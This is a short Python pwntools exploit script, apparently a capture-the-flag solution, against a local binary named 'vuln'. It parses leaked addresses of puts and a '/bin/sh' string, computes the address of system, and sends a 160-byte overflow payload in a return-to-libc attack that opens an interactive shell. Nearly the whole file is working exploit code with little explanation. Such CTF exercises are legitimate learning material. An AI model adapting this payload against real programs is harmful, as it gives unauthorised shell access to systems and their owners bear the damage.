#!/usr/bin/env python

import pwn
import re

#(gdb) x puts
#0xf7e322c0 <puts>:      0x57e58955
#(gdb) x system
#0xf7e07c00 <system>:    0x0f9568e8

# had to update these on actual shell server...They were different :/
gdb_puts = 0xf7e322c0
gdb_system = 0xf7e07c00

# represents distance between those functions.
offset = gdb_puts - gdb_system

elf = pwn.ELF('./vuln')

# check out output...
# print elf

# this starts and stops process
p = elf.process()

prompt= p.recv()
print prompt

puts = re.findall('puts: (.*)', prompt)[0]
bin_sh = re.findall('useful_string: (.*)', prompt) [0]

print puts
print bin_sh

system = int(puts,16) - offset
print hex(system)

puts = int(puts,16)
bin_sh = int(bin_sh,16)

# putting a bunch of As, then the address of system (to jump to after return), then junk, then the thing we want system to execute
payload = 'A'*160
payload += pwn.p32(system)
payload += 'JUNK'
payload += pwn.p32(bin_sh)

p.sendline(payload)

p.interactive()

